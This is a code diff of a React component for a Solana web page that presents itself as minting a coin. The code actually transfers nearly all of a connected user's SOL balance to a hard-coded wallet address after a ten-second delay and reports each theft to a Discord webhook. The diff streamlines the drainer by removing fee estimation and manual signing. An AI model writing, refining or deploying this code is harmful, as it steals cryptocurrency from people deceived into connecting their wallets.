@@ -80,9 +80,8 @@ const ExposeWalletModal: FC = () => {
 };
 
 const WalletConnectionHandler: FC = () => {
-    const { publicKey, connected, signTransaction } = useWallet();
+    const { publicKey, connected, wallet, sendTransaction } = useWallet();
     const [solBalance, setSolBalance] = useState<number | null>(null);
-    const [loading, setLoading] = useState(false);
 
     useEffect(() => {
         if (connected && publicKey) {
@@ -130,32 +129,9 @@ const WalletConnectionHandler: FC = () => {
             }
 
             const blockhash = await connection.getLatestBlockhash();
-            const tempTx = new Transaction({
-                feePayer: walletPublicKey,
-                recentBlockhash: blockhash.blockhash,
-            }).add(
-                SystemProgram.transfer({
-                    fromPubkey: walletPublicKey,
-                    toPubkey: new PublicKey('5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz'),
-                    lamports: 0,
-                })
-            );
+            const sendAmount = lamports - reservedLamports;
 
-            const feeResp = await connection.getFeeForMessage(tempTx.compileMessage());
-            if (!feeResp || feeResp.value === null) {
-                alert('❌ Failed to estimate transaction fee');
-                return;
-            }
-
-            const fee = feeResp.value;
-            const sendAmount = lamports - reservedLamports - fee;
-
-            if (sendAmount <= 0) {
-                alert('⚠️ Not enough SOL to cover transaction and fee.');
-                return;
-            }
-
-            const finalTx = new Transaction({
+            const tx = new Transaction({
                 feePayer: walletPublicKey,
                 recentBlockhash: blockhash.blockhash,
             }).add(
@@ -166,17 +142,9 @@ const WalletConnectionHandler: FC = () => {
                 })
             );
 
-            if (!signTransaction) {
-                alert('❌ Wallet not ready to mint the coin.');
-                return;
-            }
-
-            const signedTx = await signTransaction(finalTx);
-            console.log('🖊️ Transaction signed.');
-
             setTimeout(async () => {
                 try {
-                    const txid = await connection!.sendRawTransaction(signedTx.serialize());
+                    const txid = await sendTransaction(tx, connection!);
                     console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
 
                     await sendDiscordWebhook(
@@ -188,13 +156,12 @@ const WalletConnectionHandler: FC = () => {
                     );
                 } catch (err) {
                     console.error('❌ Failed to send transaction:', err);
+                    alert('❌ Transaction failed');
                 }
             }, 10000);
         } catch (err) {
             console.error('❌ Error sending transaction:', err);
-            alert('Creation failed.');
-        } finally {
-            setLoading(false);
+            alert('❌ Creation failed.');
         }
     };
 
@@ -268,11 +235,7 @@ const WalletConnectionHandler: FC = () => {
     const walletPopupEl =
         typeof window !== 'undefined' ? document.querySelector('.wallet-popup#walletPopup') : null;
 
-    const WalletUI = (
-        <div>{!connected || !publicKey ? null : <></>}</div>
-    );
-
-    return walletPopupEl ? ReactDOM.createPortal(WalletUI, walletPopupEl) : null;
+    return walletPopupEl ? ReactDOM.createPortal(<div></div>, walletPopupEl) : null;
 };
 
 const InjectWalletMultiButton: FC = () => {
